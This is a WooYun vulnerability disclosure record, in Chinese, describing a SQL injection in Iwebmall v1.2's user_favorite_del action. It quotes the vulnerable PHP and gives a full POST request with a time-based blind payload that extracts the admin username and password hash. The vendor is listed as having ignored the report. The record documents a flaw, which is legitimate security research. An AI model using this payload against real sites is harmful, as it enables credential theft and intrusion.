{"id": 42391, "wybug_id": "wooyun-2014-085935", "wybug_title": "Iwebmall最新版SQL注入第一枚", "wybug_corp": "Iwebmall", "wybug_author": "路人甲", "wybug_date": "2014-12-08 13:01", "wybug_open_date": "2015-03-08 13:02", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-08：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-03-08：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： Iwebmall最新版SQL注入第一枚 详细说明：  看到wooyun上有人提了几个iweb的漏洞（ WooYun: iwebmall商城程序sql注入 ），我来捡捡漏儿吧，希望不要重复。官网下载最新v1.2来看看。先把注入点拿出来：www.xxx.com/do.php?act=user_favorite_del，POST的内容中有个参数favorite，存在注入。/action/user/favorite_del.action.php\n无关代码// 处理post变量if(empty($_POST)){\t$favorite_id = intval(get_args('id'));}else{\t$favorite=get_args('favorite');\tif (!$favorite){\t\taction_return(1,$m_langpackage->m_del_select,'modules.php?app=user_favorite');\t}\t$favorite_id=implode(',',$favorite);}$sql = \"delete from `$t_user_favorite` where user_id='$user_id' and favorite_id in ($favorite_id)\";//echo $sql;if($dbo->exeUpdate($sql)) {\taction_return(1,$m_langpackage->m_del_success);} else {\taction_return(0,$m_langpackage->m_del_fail,'-1');}无关代码\n当通过POST方法提交$favorite时，由于没有对$favorite进行过滤，因此这里可以注入。Iweb没有错误回显，这里用time-based blind进行注入测试。Payload:\nPOST /do.php?act=user_favorite_del HTTP/1.1Host: 192.168.0.107User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh,zh-cn;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://192.168.0.107/modules.php?app=user_favoriteCookie: AJSTAT_ok_times=8; bdshare_firstime=1414502402741; PHPSESSID=kqhu73sshc8adk1ltve8ki0u02; iweb_iweb_login=xxxxxxxxxConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 189favorite%5B%5D=1) or (select if(mid((select admin_name from imall_admin_user where admin_id=1 limit 0,1),1,1)='z',sleep(3),0)) and (1)=(1&deletesubmit=%E6%89%B9%E9%87%8F%E5%88%A0%E9%99%A4\n登测试时：登陆后访问如上的请求，抓包，按上面的payload进行修改即可，抓包，按上面的payload进行修改即可。这里注意，favorite的值随便写一个值，本例为1。因为是time-based blind 注入，猜测管理员用户名的第一个字母时，若错误，延迟2s左右，如下图\n\n若正确，延迟5s左右，如下图\n\n按上面的方法依次做下去（burp intruder或者自己写个脚本跑），可测试管理员用户名为：admin，密码为： 21232f297a57a5a743894a0e4a801fc3   漏洞证明：  见 详细说明   修复方案：  intval   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}